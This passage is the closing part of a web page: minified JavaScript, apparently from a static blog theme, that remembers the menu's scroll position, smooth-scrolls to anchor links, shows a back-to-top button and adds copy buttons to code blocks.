menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>